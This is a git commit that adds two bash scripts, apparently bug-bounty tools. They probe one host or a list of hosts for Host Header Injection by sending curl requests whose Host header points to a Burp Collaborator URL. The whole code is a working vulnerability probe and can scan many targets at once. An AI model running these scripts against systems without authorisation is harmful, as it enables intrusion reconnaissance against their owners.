71361dc5878b50fdb51869c9b9dd3d438f0109da
kaiz3n <49936643+abundov@users.noreply.github.com>
2021-09-01 16:36:12 -0500

    Add files via upload

---
+++ mahost-mass.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+# MaHost-mass v1.0
+# Coded by kaiz3n
+
+
+
+echo
+echo
+echo
+echo "    _  __       _   _           _                                        _   ___   "
+echo "  |  \/  | __ _| | | | ___  ___| |_      _ __ ___   __ _ ___ ___  __   _/ | / _ \  "
+echo "  | |\/| |/ _' | |_| |/ _ \/ __| __|____| '_ ' _ \ / _' / __/ __| \ \ / / || | | | "
+echo "  | |  | | (_| |  _  | (_) \__ \ ||_____| | | | | | (_| \__ \__ \  \ V /| || |_| | "
+echo "  |_|  |_|\__,_|_| |_|\___/|___/\__|    |_| |_| |_|\__,_|___/___/   \_/ |_(_)___/  "
+echo
+echo
+echo
+echo "This is MaHost-mass v1.0 - Test many hosts at once to see if they are vulnerable to Host Header Injection via Burp Collaborator + Curl"
+echo
+echo "Please enter the file which contains hosts to test for Host Header injection: (https://some.domain.com) "; read host
+echo "Please enter your Burp Collaborator URL where you will receive requests: "; read burpcollaborator
+echo
+echo
+echo "------------------------------------------------------------------------"
+while IFS= read -r line
+do
+	echo "Tested: ${line} "
+	echo "------------------------------------------------------------------------"
+	curl -s -X GET -H "Host: ${burpcollaborator}" ${line} -I -L
+	echo "------------------------------------------------------------------------"
+done <"$host"
+echo "------------------------------------------------------------------------"
+echo
+echo
+echo "Let's see if it worked! Your response should have the following header: "
+echo
+echo "------------------------------------------------------------------------"
+echo "**** Server: Burp Collaborator https://burpcollaborator.net/ ****"
+echo "-------------------------------------------------------------------------"
+echo
+echo "If it does = SUCCESS (Check Burp Collaborator client for request); if it doesn't TRY AGAIN!"
+
---
+++ mahost-single.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+# MaHost-single v1.0
+# Coded by kaiz3n
+
+echo
+echo
+echo "  __  __       _   _           _            _             _              _   ___   "
+echo " |  \/  | __ _| | | | ___  ___| |_      ___(_)_ __   __ _| | ___  __   _/ | / _ \  "
+echo " | |\/| |/ _' | |_| |/ _ \/ __| __|____/ __| | '_ \ / _' | |/ _ \ \ \ / / || | | | "
+echo " | |  | | (_| |  _  | (_) \__ \ ||_____\__ \ | | | | (_| | |  __/  \ V /| || |_| | "
+echo " |_|  |_|\__'_|_| |_|\___/|___/\__|    |___/_|_| |_|\__, |_|\___|   \_/ |_(_)___/  "
+echo "                                                   |___/                           "
+echo
+echo
+echo "This is MaHost-single v1.0 - Test a single host if its vulnerable to Host Header Injection via Burp Collaborator + Curl"
+echo
+echo "Please enter the host to test for Host Header injection: (https://some.domain.com) "; read host
+echo "Please enter your Burp Collaborator URL where you will receive requests: "; read burpcollaborator
+echo
+echo
+echo "------------------------------------------------------------------------"
+curl -s -X GET -H "Host: ${burpcollaborator}" ${host} -I -L
+echo "------------------------------------------------------------------------"
+echo
+echo
+echo "Let's see if it worked! Your response should have the following header: "
+echo
+echo "------------------------------------------------------------------------"
+echo "**** Server: Burp Collaborator https://burpcollaborator.net/ ****"
+echo"-------------------------------------------------------------------------"
+echo
+echo "If it does = SUCCESS (Check Burp Collaborator client for request); if it doesn't TRY AGAIN!"
+
